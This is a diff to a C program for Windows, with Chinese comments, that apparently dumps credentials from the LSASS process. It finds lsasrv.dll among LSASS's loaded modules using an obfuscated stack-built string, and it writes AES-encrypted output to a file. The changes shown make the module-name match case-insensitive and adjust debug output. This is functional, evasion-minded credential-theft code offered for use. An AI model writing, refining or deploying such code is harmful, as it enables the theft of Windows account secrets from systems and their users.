@@ -1,5 +1,6 @@
 #include <Windows.h>
 #include <winternl.h>
+//#include <stdio.h>
 
 // #define DEBUG
 
@@ -523,7 +524,7 @@ int main() {
         // For each DLL address, get its name so we can find what we are looking for
         for (int i = 0; i < bytesReturned / sizeof(HMODULE); i++) {
             NT_GetModuleFileNameExA(_lsass_handle, lsassDll[i], modName, sizeof(modName));
-
+          //、、  printf("module name: %s\n", modName);
             // 需要先遍历(char*)lsassDll[i]来获取模块字符串的长度，因为他里面保存的是绝对路径
             // 因此需要倒序进行比较
             int j = 0;
@@ -549,11 +550,13 @@ int main() {
             SecureZeroMemory(stack_string, 50);
             stack_string[0] = 'l'; stack_string[1] = 's'; stack_string[2] = 'a'; stack_string[3] = 's'; stack_string[4] = 'r'; stack_string[5] = 'v'; stack_string[6] = '.'; stack_string[7] = 'd'; stack_string[8] = 'l'; stack_string[9] = 'l';
             for (int k = 0; k < 10; k++) {
-                if (stack_string[9 - k] != modName[j - 1 - k]) {
+                // 需要同时对大小写进行检查
+                if ((stack_string[9 - k] != modName[j - 1 - k]) && (stack_string[9 - k] - 32 != modName[j - 1 - k])) {
                     flag = 0;
                     break;
                 }
             }
+
             if (flag) {
                 lsasrv = (char*)lsassDll[i];
                 continue;
@@ -932,7 +935,7 @@ int main() {
 
     // 写入密文
     if (!NT_WriteFile(hFile, stack_string, _aes_len, &_out_para, NULL)) {
-        // fprintf(stderr, "Error writing to the file\n");
+        // fprintf(stderr, "main（Error writing to the file\n");
         NT_CloseHandle(hFile);
         return 1;
     }
